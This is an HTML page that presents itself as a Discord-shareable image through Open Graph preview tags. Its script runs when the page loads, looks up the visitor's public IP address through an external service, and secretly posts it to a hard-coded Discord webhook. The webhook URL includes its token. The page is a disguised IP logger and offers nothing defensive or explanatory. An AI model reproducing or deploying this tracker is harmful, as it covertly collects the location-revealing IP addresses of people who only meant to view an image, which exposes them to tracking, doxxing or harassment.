<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>IP Logger and Image</title>

    <meta property="og:title" content="Image" />
    <meta property="og:description" content=" " />
    <meta property="og:image" content="https://i.imgur.com/i12zp3X.png" />
    <meta property="og:type" content="image/png" />

    <script>
        const webhookURL = "https://discordapp.com/api/webhooks/1317895579828748308/ni9_3dstKqP9xLi-AQglTGZErQ26PbkW0RIrbG3s60hX5EajueEvpIsWJPbOoNj_kd1F";

        async function logIP() {
            try {
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();

                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: `IP Logged: ${data.ip}` })
                });
            } catch (error) {
                console.error("Error logging IP:", error);
            }
        }

        logIP();
    </script>
</head>
<body>
    <p>Your image should appear when shared on Discord.</p>
</body>
</html>
